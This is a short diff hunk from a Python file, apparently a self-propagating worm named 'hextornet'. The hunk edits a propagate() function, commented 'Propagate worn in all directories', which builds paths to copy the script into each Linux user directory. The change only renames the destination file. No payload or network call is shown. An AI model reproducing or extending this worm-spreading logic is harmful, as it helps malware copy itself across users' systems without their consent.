@@ -43,7 +43,7 @@ def propagate():
 	#Propagate worn in all directories
 	for directory in directoriesLinux:
 		if(os.path.isdir("/" + usr + "/" + directory + "/")):
-			dst = "/" + usr + "/" + directory + "/" + "hextornet1.py"
+			dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
 		else:
 			dst = os.getcwd() + "hextornet.py"
 	
